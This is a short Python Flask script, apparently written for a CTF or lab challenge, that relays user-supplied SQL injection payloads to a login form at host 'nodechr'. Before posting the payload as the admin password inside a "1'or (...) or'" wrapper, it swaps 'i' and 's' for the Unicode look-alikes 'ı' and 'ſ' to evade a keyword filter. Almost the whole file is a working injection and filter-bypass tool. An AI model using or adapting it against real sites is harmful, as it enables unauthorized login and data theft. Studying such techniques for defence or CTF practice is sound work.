# encoding: utf-8
# sqli-reverse-flask.py

from flask import Flask,request,jsonify
import requests
import urllib.request
import urllib.parse


def remote_login(payload):
    '''
    对服务器发起访问请求
    '''

    burp0_url = "http://nodechr:80/login/"
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://nodechr", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 es360messenger/6.6.5-600677 Safari/537.36 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://nodechr/login/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    payload = "1'or (%s) or'" % payload
    burp0_data = {"username": "admin", "password": payload}
    resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    # burp0_url = burp0_url.format(payload)
    # burp0_data = {"act": "verify", "username[0]": 'exp', "username[1]": pay, "password": "", "verify": ""}
    return resp.text

app = Flask(__name__)
@app.route('/')
def login():
    payload =  request.args.get("id")
    # I  -->  ı  ->  %C4%B1
    # S  -->  ſ  ->  %C5%BF

    payload = payload.lower()
    # payload = payload.replace("i", urllib.parse.unquote("%C4%B1"))

    payload = payload.replace("i", "ı")
    payload = payload.replace("s", "ſ")
    # payload = payload.replace("--", "OR'")

    print(payload)
    response = remote_login(payload)
    return response

if __name__ == '__main__':
    app.run()